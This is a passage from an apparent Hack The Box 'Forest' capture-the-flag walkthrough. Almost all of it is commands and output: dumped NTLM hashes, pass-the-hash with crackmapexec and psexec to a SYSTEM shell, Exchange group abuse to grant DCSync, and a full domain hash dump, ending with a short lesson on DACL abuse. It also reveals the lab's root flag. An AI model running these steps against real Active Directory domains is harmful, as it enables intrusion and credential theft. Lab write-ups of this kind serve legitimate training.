+htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
+htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
+htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
+htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
+htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
+[-] timed out
+[*] Something wen't wrong with the DRSUAPI approach. Try again with -use-vss parameter
+[*] Cleaning up... 
+==============================================================================================
+
+Based on trial and error you have to run the commands several time in order for secretsdump.py 
+to work properly.
+
+We can now run crackmapexec and use the creds for administrator to test if the hash works
+
+COMMAND:
+==============================================================================================
+cme smb 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
+==============================================================================================
+OUTPUT:
+==============================================================================================
+SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
+SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator 32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
+==============================================================================================
+
+We can attempt to get a shell with psexec from impacket.
+COMMAND:
+==============================================================================================
+/opt/impacket-venv/bin/psexec.py htb.local/administrator@10.10.10.161 -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6
+==============================================================================================
+OUTPUT:
+==============================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.161.....
+[*] Found writable share ADMIN$
+[*] Uploading file uoOURjci.exe
+[*] Opening SVCManager on 10.10.10.161.....
+[*] Creating service dMpy on 10.10.10.161.....
+[*] Starting service dMpy.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+c:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is E8B0-D68E
+
+ Directory of c:\Users\Administrator\Desktop
+
+09/23/2019  01:15 PM    <DIR>          .
+09/23/2019  01:15 PM    <DIR>          ..
+09/23/2019  01:15 PM                32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  31,383,646,208 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+f048153f202bbb2f82622b04d79129cc
+==============================================================================================
+
+
+
+
+EXTRA ======= Created New User "PONG" and DCSync attack worked fine. Steps below:
+COMMAND AND OUTPUT:
+==============================================================================================
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add pong
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+
+-------------------------------------------------------------------------------
+jpow                     pong
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+
+-------------------------------------------------------------------------------
+jpow                     pong
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'pingpong' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\pong', $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pong -Rights DCSync*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" /add pong
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+
+-------------------------------------------------------------------------------
+jpow                     pong
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
+Group name     Exchange Windows Permissions
+Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
+
+Members
+
+-------------------------------------------------------------------------------
+jpow                     pong
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $pass = convertto-securestring 'pingpong' -AsPlainText -Force
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $cred = New-Object System.Management.Automation.PSCredential('htb\pong', $pass)
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity pong -Rights DCSync
+==============================================================================================
+
+
+COMMAND and OUTPUT from attack machine:
+==============================================================================================
+root@kali:~/htb/forest/smb# /opt/impacket-venv/bin/secretsdump.py htb.local/pong:pingpong@10.10.10.161 | tee hashes.out
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
+htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
+htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
+htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
+htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
+htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
+jpow:7601:aad3b435b51404eeaad3b435b51404ee:b558d20216aa2b9b2dc63f4d22eb9b45:::
+pong:7603:aad3b435b51404eeaad3b435b51404ee:770ddc96a31d5f462d6a9dd82df22af1:::
+FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:fd5d0a53094370cf9e4fbd7fb6ae8531:::
+...
+...
+...
+EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
+EXCH01$:des-cbc-md5:8c45f44c16975129
+[*] Cleaning up... 
+==============================================================================================
+
+The lesson to be learned is that from bloodhound we were able to map our progression to the local
+administrator and from there we could grant ourselves permission to the "EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL" which has the ability to modify the DACL (Discretionary Access Control List) on the 
+domain HTB.LOCAL. With write access to the target object's DACL, you can grant yourself any privilegeyou want on the object.
+
+COMMAND:
+==============================================================================================
+==============================================================================================
+OUTPUT:
+==============================================================================================
+==============================================================================================
